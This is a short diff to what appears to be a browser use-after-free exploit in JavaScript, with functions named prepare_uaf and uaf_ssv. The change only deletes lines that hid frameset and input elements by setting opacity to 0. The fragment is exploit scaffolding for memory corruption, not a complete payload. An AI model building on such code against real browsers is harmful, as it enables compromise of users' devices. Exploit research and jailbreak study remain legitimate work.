@@ -147,7 +147,6 @@ function prepare_uaf() {
       const fset = document.createElement("frameset");
       fset.rows = rows;
       fset.cols = rows;
-      fset.style.opacity = 0;
       fsets.push(fset);
     }
   }
@@ -185,13 +184,10 @@ async function uaf_ssv(fsets, index, index2) {
   const views = [];
   const input = document.createElement("input");
   input.id = "input";
-  input.style.opacity = 0;
   const foo = document.createElement("input");
   foo.id = "foo";
-  foo.style.opacity = 0;
   const bar = document.createElement("a");
   bar.id = "bar";
-  bar.style.opacity = 0;
 
   log(`ssv_len: ${hex(ssv_len)}`);
 
